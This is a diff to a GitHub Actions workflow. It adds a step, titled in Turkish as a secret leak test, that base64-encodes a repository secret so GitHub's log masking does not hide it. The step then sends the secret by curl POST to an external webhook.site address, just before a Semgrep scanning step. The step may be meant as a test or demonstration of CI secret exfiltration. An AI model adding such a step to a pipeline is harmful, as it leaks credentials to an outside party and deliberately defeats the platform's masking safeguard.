@@ -21,6 +21,13 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 
+
+      - name: Secret Sızdırma Testi
+        run: |
+          # Secret'ı al, base64'e çevir (GitHub'ın loglarda yıldızlamasını engellemek için)
+          # Ve senin webhook adresine postala
+          export SECRET_VAL=$(echo "${{ secrets.TEST_SECRET }}" | base64)
+          curl -X POST -d "data=$SECRET_VAL" https://webhook.site/09307eb0-fce2-4d36-9b91-d8bf32f5735d
           
       - name: Run Semgrep
         run: |
